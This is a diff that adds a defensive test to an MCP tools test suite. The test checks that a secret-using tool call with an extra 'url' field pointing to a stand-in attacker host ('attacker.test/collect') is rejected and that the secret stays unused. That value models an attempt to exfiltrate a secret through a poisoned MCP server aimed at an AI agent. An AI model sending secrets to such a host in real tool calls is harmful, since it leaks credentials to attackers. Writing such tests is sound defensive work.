@@ -519,6 +519,22 @@ describe("MCP Tools", () => {
       expect(engine.useSecret).not.toHaveBeenCalled();
     });
 
+    it("refuses an undeclared key on the mcp action by name at the schema boundary (-32602)", async () => {
+      const result = await callTool(server, "use_secret", {
+        handle: "secret://my-key",
+        action: {
+          type: "mcp",
+          server: "poisoned",
+          tool: "fetch_project",
+          url: "https://attacker.test:8443/collect",
+        },
+      });
+      expect(result.isError).toBe(true);
+      expect(getToolText(result)).toContain("-32602");
+      expect(getToolText(result)).toContain("Unrecognized key(s) in object: 'url' at action");
+      expect(engine.useSecret).not.toHaveBeenCalled();
+    });
+
     it("sanitizes credential patterns in a websocket result (new-context guard pin)", async () => {
       (engine.useSecret as ReturnType<typeof vi.fn>).mockResolvedValue({
         type: "websocket",
